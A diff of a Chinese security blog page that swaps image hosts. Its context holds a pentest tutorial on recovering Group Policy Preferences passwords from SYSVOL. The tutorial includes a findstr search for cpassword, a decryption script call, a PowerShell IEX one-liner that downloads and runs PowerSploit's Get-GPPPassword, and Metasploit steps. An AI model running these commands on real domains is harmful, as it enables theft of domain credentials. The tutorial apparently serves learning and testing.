@@ -271,7 +271,7 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210728144214.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210728144214.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
@@ -473,15 +473,15 @@
 <p>管理员在域中新建一个组策略后，系统会自动在 SYSVOL 目录中生成一个 XML 文件。</p>
 <p>该文件中保存了该组策略更新后的密码，该密码使用 AES-256 算法，但 2012 年微软公布了该密码的私钥，也就是说任何人都可以对其进行解密。</p>
 <h2 id="1、查找包含-cpassword-的-XML-文件"><a href="#1、查找包含-cpassword-的-XML-文件" class="headerlink" title="1、查找包含 cpassword 的 XML 文件"></a>1、查找包含 cpassword 的 XML 文件</h2><p>浏览 SYSVOL 文件夹，手动查找包含 cpassword 的 XML 文件</p>
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210728141704.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210728141704.png"></p>
 <p>或者使用 findstr 自动搜索包含 cpassword 的 XML 文件</p>
 <pre class="line-numbers language-none"><code class="language-none">findstr &#x2F;s &#x2F;i &quot;cpassword&quot; C:\Windows\SYSVOL\*.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210728142511.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210728142511.png"></p>
 <h2 id="2、解密-cpassword-密文"><a href="#2、解密-cpassword-密文" class="headerlink" title="2、解密 cpassword 密文"></a>2、解密 cpassword 密文</h2><h3 id="python-脚本"><a href="#python-脚本" class="headerlink" title="python 脚本"></a>python 脚本</h3><p> Gpprefdecrypt.py 下载地址：<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/leonteale/pentestpackage/master/Gpprefdecrypt.py">https://raw.githubusercontent.com/leonteale/pentestpackage/master/Gpprefdecrypt.py</a></p>
 <pre class="line-numbers language-none"><code class="language-none">python2.7 Gpprefdecrypt.py Wdkeu1drbxqPJm7YAtPtwBtyzcqO88hJUBDD2eseoY0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210728143302.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210728143302.png"></p>
 <h3 id="PowerShell-脚本"><a href="#PowerShell-脚本" class="headerlink" title="PowerShell 脚本"></a>PowerShell 脚本</h3><p>PowerSploit 项目中提供了 Get-GPPPassword.ps1 脚本。</p>
 <p>脚本下载地址：<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1</a></p>
 <p>直接远程下载脚本执行：</p>
@@ -490,7 +490,7 @@
 <p>如果无法下载可以使用 github 代理</p>
 <pre class="line-numbers language-none"><code class="language-none">PowerShell.exe -Exec Bypass -C &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;ghproxy.com&#x2F;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;PowerShellMafia&#x2F;PowerSploit&#x2F;master&#x2F;Exfiltration&#x2F;Get-GPPPassword.ps1&#39;);Get-GPPPassword&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210728144214.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210728144214.png"></p>
 <p>或者下载到本地，执行也行</p>
 <pre class="line-numbers language-none"><code class="language-none">Import-Module .\Get-GPPPassword.ps1
 Get-GPPPassword<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
@@ -503,11 +503,11 @@ Get-GPPPassword<span aria-hidden="true" class="line-numbers-rows"><span></span><
 set session 1
 run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210728145138.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210728145138.png"></p>
 <blockquote>
 <p>更多信息欢迎关注我的微信公众号：TeamsSix</p>
 </blockquote>
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/TeamsSix_Subscription_Logo2.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>
 
                 
             </div>
@@ -659,7 +659,7 @@ run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span>
                 <a href="/210729-110334.html">
                     <div class="card-image">
                         
-                        <img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210729101949.png" class="responsive-img" alt="【内网学习笔记】17、令牌窃取">
+                        <img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210729101949.png" class="responsive-img" alt="【内网学习笔记】17、令牌窃取">
                         
                         <span class="card-title">【内网学习笔记】17、令牌窃取</span>
                     </div>
@@ -715,7 +715,7 @@ run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span>
                 <a href="/210728-130839.html">
                     <div class="card-image">
                         
-                        <img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210727162552.png" class="responsive-img" alt="【内网学习笔记】浅谈几个 Windows 错误配置利用的方法">
+                        <img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210727162552.png" class="responsive-img" alt="【内网学习笔记】浅谈几个 Windows 错误配置利用的方法">
                         
                         <span class="card-title">【内网学习笔记】浅谈几个 Windows 错误配置利用的方法</span>
                     </div>
